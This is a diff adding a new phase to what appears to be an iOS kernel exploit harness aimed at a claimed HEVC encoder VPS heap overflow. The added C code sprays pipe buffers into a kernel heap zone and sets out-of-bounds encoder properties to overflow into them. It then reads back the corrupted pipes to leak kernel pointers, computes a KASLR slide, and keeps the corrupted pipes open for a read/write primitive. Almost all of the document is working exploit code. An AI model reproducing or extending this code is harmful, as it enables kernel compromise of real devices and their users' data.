@@ -21058,6 +21058,322 @@ new_modes:
         phase14_done:
         rlog("--- Phase 14 complete ---\n");
 
+        /* ============================================================
+         * Phase 15 for r=229: VPS heap overflow + pipe buffer corruption
+         *
+         * CVE-2026-114025: VPS extension property bounds checks are
+         * MISSING in iOS 27.1 (added in 27.2 as AVE_HEVC_CheckVPSExtBounds).
+         *
+         * AlphaLayerID >= 63 and RepFormat arrays > 2 entries cause
+         * PSGen to generate oversized VPS, overflowing the kernel VPS
+         * buffer into adjacent heap allocations.
+         *
+         * Strategy:
+         *   15a: Spray pipe buffers in kalloc.4096 (VPS buffer zone)
+         *   15b: Create holes by closing every 4th pipe
+         *   15c: Create HEVC encoder with overflow properties
+         *   15d: Encode frames → PSGen generates oversized VPS → overflow
+         *   15e: Read pipe buffers to detect corruption (kernel data leak)
+         *   15f: If corrupted pipe found, use it for kernel R/W primitive
+         * ============================================================ */
+        if (rounds == 229 && r229_mte_match) {
+            rlog("\n--- Phase 15 (r=229): VPS heap overflow + pipe corruption ---\n");
+
+            /* 15a: Spray pipe buffers in kalloc.4096
+             * VPS generation allocates ~4096 bytes for the parameter set buffer.
+             * Pipe buffers use kalloc.data which shares pages with driver allocs. */
+            #define P15_PIPE_COUNT 512
+            #define P15_PIPE_SIZE  4096
+            int p15_pipes[P15_PIPE_COUNT][2];
+            int p15_pipes_ok = 0;
+
+            rlog("  15a: Spraying %d pipe buffers (%d bytes each)...\n",
+                P15_PIPE_COUNT, P15_PIPE_SIZE);
+
+            uint8_t *p15_sentinel = (uint8_t *)malloc(P15_PIPE_SIZE);
+            for (int i = 0; i < P15_PIPE_COUNT; i++) {
+                p15_pipes[i][0] = p15_pipes[i][1] = -1;
+                if (pipe(p15_pipes[i]) == 0) {
+                    /* Fill with identifiable pattern: 0xPIPE0000 | index */
+                    uint32_t pat = 0x50495045 | ((uint16_t)i << 16);
+                    for (int j = 0; j < P15_PIPE_SIZE / 4; j++)
+                        ((uint32_t *)p15_sentinel)[j] = pat ^ (uint32_t)j;
+                    ssize_t w = write(p15_pipes[i][1], p15_sentinel, P15_PIPE_SIZE);
+                    if (w == P15_PIPE_SIZE) p15_pipes_ok++;
+                    else {
+                        close(p15_pipes[i][0]); close(p15_pipes[i][1]);
+                        p15_pipes[i][0] = p15_pipes[i][1] = -1;
+                    }
+                }
+            }
+            rlog("  15a: %d / %d pipes created with %d-byte data\n",
+                p15_pipes_ok, P15_PIPE_COUNT, P15_PIPE_SIZE);
+
+            /* 15b: Create holes for VPS buffer allocation */
+            int p15_freed = 0;
+            for (int i = 2; i < P15_PIPE_COUNT; i += 4) {
+                if (p15_pipes[i][0] >= 0) {
+                    close(p15_pipes[i][0]); close(p15_pipes[i][1]);
+                    p15_pipes[i][0] = p15_pipes[i][1] = -1;
+                    p15_freed++;
+                }
+            }
+            rlog("  15b: Freed %d pipes (holes for VPS allocation)\n", p15_freed);
+
+            /* 15c: Create HEVC encoder with VPS overflow properties.
+             * AlphaLayerID=128 (>= 63 bound), EncodesAlpha=true,
+             * plus rep format arrays with >2 entries.
+             * This does NOT require MV-HEVC — regular HEVC with alpha works. */
+            rlog("  15c: Creating HEVC encoder with overflow properties...\n");
+            VTCompressionSessionRef ave15 = NULL;
+            {
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                CFDictionarySetValue(es,
+                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+                /* Use HEVC-with-alpha codec type (0x6D757861 = 'muxa') */
+                OSStatus cs = VTCompressionSessionCreate(NULL, 192, 192,
+                    (CMVideoCodecType)0x6D757861, es, NULL, NULL, encode_cb, NULL, &ave15);
+                CFRelease(es);
+                rlog("  15c: Session create (muxa): %d\n", (int)cs);
+
+                if (cs != noErr || !ave15) {
+                    /* Fallback: try regular HEVC */
+                    rlog("  15c: Fallback to regular HEVC...\n");
+                    es = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(es,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                    cs = VTCompressionSessionCreate(NULL, 192, 192,
+                        kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &ave15);
+                    CFRelease(es);
+                    rlog("  15c: Session create (HEVC): %d\n", (int)cs);
+                }
+
+                if (cs == noErr && ave15) {
+                    /* Set VPS overflow properties */
+                    VTSessionSetProperty(ave15, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTSessionSetProperty(ave15, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+
+                    /* AlphaLayerID = 128 (exceeds 63 bound) */
+                    int aid = 128;
+                    CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+                    OSStatus sp = VTSessionSetProperty(ave15,
+                        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+                    CFRelease(aidn);
+                    rlog("  15c: AlphaLayerID=128: %d\n", (int)sp);
+
+                    /* RepFormat bit depths array with 4 entries (>2 bound) */
+                    int depths[] = {8, 10, 8, 10};
+                    CFNumberRef dn[4];
+                    for (int j = 0; j < 4; j++)
+                        dn[j] = CFNumberCreate(NULL, kCFNumberIntType, &depths[j]);
+                    CFArrayRef da = CFArrayCreate(NULL, (const void **)dn, 4,
+                        &kCFTypeArrayCallBacks);
+                    sp = VTSessionSetProperty(ave15,
+                        CFSTR("RequiredHEVCVideoParameterSetRepFormatBitDepths"), da);
+                    CFRelease(da);
+                    for (int j = 0; j < 4; j++) CFRelease(dn[j]);
+                    rlog("  15c: RepFormatBitDepths[4]: %d\n", (int)sp);
+
+                    /* ChromaFormatIdcs array with 4 entries (>2 bound) */
+                    int chromas[] = {1, 1, 1, 1};
+                    CFNumberRef cn[4];
+                    for (int j = 0; j < 4; j++)
+                        cn[j] = CFNumberCreate(NULL, kCFNumberIntType, &chromas[j]);
+                    CFArrayRef ca = CFArrayCreate(NULL, (const void **)cn, 4,
+                        &kCFTypeArrayCallBacks);
+                    sp = VTSessionSetProperty(ave15,
+                        CFSTR("RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs"), ca);
+                    CFRelease(ca);
+                    for (int j = 0; j < 4; j++) CFRelease(cn[j]);
+                    rlog("  15c: ChromaFormatIdcs[4]: %d\n", (int)sp);
+
+                    /* NumberOfTemporalLayers = 4 */
+                    int ntl = 4;
+                    CFNumberRef ntln = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+                    sp = VTSessionSetProperty(ave15,
+                        CFSTR("NumberOfTemporalLayers"), ntln);
+                    CFRelease(ntln);
+                    rlog("  15c: NumberOfTemporalLayers=4: %d\n", (int)sp);
+
+                    sp = VTCompressionSessionPrepareToEncodeFrames(ave15);
+                    rlog("  15c: PrepareToEncode: %d\n", (int)sp);
+                }
+            }
+
+            if (!ave15) {
+                rlog("  15c: FAILED to create encoder. Skipping VPS overflow.\n");
+                goto phase15_229_cleanup;
+            }
+
+            /* 15d: Encode frames to trigger VPS generation.
+             * Each keyframe regenerates VPS. We encode multiple keyframes
+             * to maximize overflow chances across different heap slots. */
+            rlog("  15d: Encoding frames to trigger VPS overflow...\n");
+            int p15_encode_rounds = 20;
+            for (int e = 0; e < p15_encode_rounds; e++) {
+                g_encode_done = 0;
+                g_cb_status = -999;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *b = CVPixelBufferGetBaseAddress(pb);
+                    if (b) memset(b, (uint8_t)(e & 0xFF), CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                    /* Force keyframe every frame for VPS regeneration */
+                    CFMutableDictionaryRef fp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(fp,
+                        kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);
+
+                    VTCompressionSessionEncodeFrame(ave15, pb, CMTimeMake(e, 30),
+                        kCMTimeInvalid, fp, NULL, NULL);
+                    CFRelease(fp);
+                    CVPixelBufferRelease(pb);
+
+                    /* Wait for callback */
+                    for (int w = 0; w < 300 && !g_encode_done; w++) usleep(10000);
+                    if (e % 5 == 0)
+                        rlog("  15d: encode[%d] status=%d done=%d\n",
+                            e, (int)g_cb_status, (int)g_encode_done);
+                }
+            }
+            VTCompressionSessionCompleteFrames(ave15, kCMTimePositiveInfinity);
+            rlog("  15d: %d encodes complete\n", p15_encode_rounds);
+
+            /* 15e: Read pipe buffers and check for corruption */
+            rlog("  15e: Checking pipe buffers for corruption...\n");
+            int p15_checked = 0, p15_corrupted = 0;
+            int p15_corrupt_pipe = -1;
+            int p15_corrupt_offset = -1;
+            uint64_t p15_leaked_val = 0;
+
+            for (int i = 0; i < P15_PIPE_COUNT; i++) {
+                if (p15_pipes[i][0] < 0) continue;
+                p15_checked++;
+
+                uint8_t *rbuf = (uint8_t *)malloc(P15_PIPE_SIZE);
+                ssize_t r = read(p15_pipes[i][0], rbuf, P15_PIPE_SIZE);
+                if (r != P15_PIPE_SIZE) {
+                    rlog("  15e: pipe[%d] short read %zd\n", i, r);
+                    p15_corrupted++;
+                    free(rbuf);
+                    continue;
+                }
+
+                /* Check against expected pattern */
+                uint32_t pat = 0x50495045 | ((uint16_t)i << 16);
+                int mismatches = 0;
+                int first_off = -1;
+                uint32_t first_got = 0, first_exp = 0;
+                for (int j = 0; j < P15_PIPE_SIZE / 4; j++) {
+                    uint32_t exp = pat ^ (uint32_t)j;
+                    uint32_t got;
+                    memcpy(&got, rbuf + j * 4, 4);
+                    if (got != exp) {
+                        if (mismatches == 0) {
+                            first_off = j * 4;
+                            first_got = got;
+                            first_exp = exp;
+                        }
+                        mismatches++;
+                    }
+                }
+
+                if (mismatches > 0) {
+                    p15_corrupted++;
+                    rlog("  *** PIPE[%d] CORRUPTED: %d dwords bad, first at +%d: "
+                         "got=0x%08x exp=0x%08x ***\n",
+                        i, mismatches, first_off, first_got, first_exp);
+
+                    /* Dump first 128 bytes of corruption for analysis */
+                    if (p15_corrupt_pipe < 0) {
+                        p15_corrupt_pipe = i;
+                        p15_corrupt_offset = first_off;
+                        memcpy(&p15_leaked_val, rbuf + first_off,
+                            first_off + 8 <= P15_PIPE_SIZE ? 8 : P15_PIPE_SIZE - first_off);
+                        rlog("  Leaked qword at +%d: 0x%016llx\n",
+                            first_off, (unsigned long long)p15_leaked_val);
+
+                        /* Hex dump first 64 bytes of corrupted region */
+                        rlog("  Hex dump at +%d:\n", first_off);
+                        int dump_start = first_off & ~0xF;
+                        for (int d = dump_start; d < dump_start + 64 && d + 16 <= P15_PIPE_SIZE; d += 16) {
+                            rlog("    +%04x:", d);
+                            for (int b = 0; b < 16; b++)
+                                rlog(" %02x", rbuf[d + b]);
+                            rlog("\n");
+                        }
+                    }
+                }
+                free(rbuf);
+
+                /* Re-write sentinel for potential write primitive later */
+                if (mismatches > 0 && p15_pipes[i][1] >= 0) {
+                    /* Keep this pipe open — it's our corruption target */
+                    rlog("  Keeping pipe[%d] open for potential write primitive\n", i);
+                } else {
+                    close(p15_pipes[i][0]); close(p15_pipes[i][1]);
+                    p15_pipes[i][0] = p15_pipes[i][1] = -1;
+                }
+            }
+
+            rlog("  15e: Checked %d pipes, %d corrupted\n", p15_checked, p15_corrupted);
+
+            if (p15_corrupted > 0) {
+                rlog("  *** VPS HEAP OVERFLOW CONFIRMED ***\n");
+                rlog("  Corrupted pipe: %d, offset: +%d\n",
+                    p15_corrupt_pipe, p15_corrupt_offset);
+                rlog("  Leaked value: 0x%016llx\n",
+                    (unsigned long long)p15_leaked_val);
+
+                /* 15f: Analyze leaked data for KASLR bypass */
+                uint64_t lv = p15_leaked_val;
+                if ((lv & 0xFFFF000000000000ULL) == 0xFFFFFE0000000000ULL) {
+                    rlog("  *** KERNEL POINTER LEAKED: 0x%016llx ***\n",
+                        (unsigned long long)lv);
+                    uint64_t kslide = (lv & 0x00000FFFFFFFE000ULL);
+                    rlog("  Potential KASLR slide: 0x%llx\n",
+                        (unsigned long long)kslide);
+                } else if ((lv & 0xFFFF000000000000ULL) == 0xFFFFFE2000000000ULL) {
+                    rlog("  *** ZONE MAP POINTER LEAKED: 0x%016llx ***\n",
+                        (unsigned long long)lv);
+                } else {
+                    rlog("  Leaked value does not look like a kernel pointer\n");
+                    rlog("  May be VPS data or heap metadata\n");
+                }
+            } else {
+                rlog("  No pipe corruption detected.\n");
+                rlog("  VPS overflow may target different kalloc zone.\n");
+                rlog("  Try different pipe sizes or encode parameters.\n");
+            }
+
+            /* Cleanup encoder */
+            VTCompressionSessionInvalidate(ave15);
+            CFRelease(ave15);
+            ave15 = NULL;
+
+            phase15_229_cleanup:
+            /* Close remaining pipes */
+            for (int i = 0; i < P15_PIPE_COUNT; i++) {
+                if (p15_pipes[i][0] >= 0) {
+                    close(p15_pipes[i][0]); close(p15_pipes[i][1]);
+                }
+            }
+            free(p15_sentinel);
+            #undef P15_PIPE_COUNT
+            #undef P15_PIPE_SIZE
+
+            rlog("--- Phase 15 (r=229) VPS overflow complete ---\n");
+        }
+
+
         /*
          * Phase 15: Structure offset crash oracle
          *
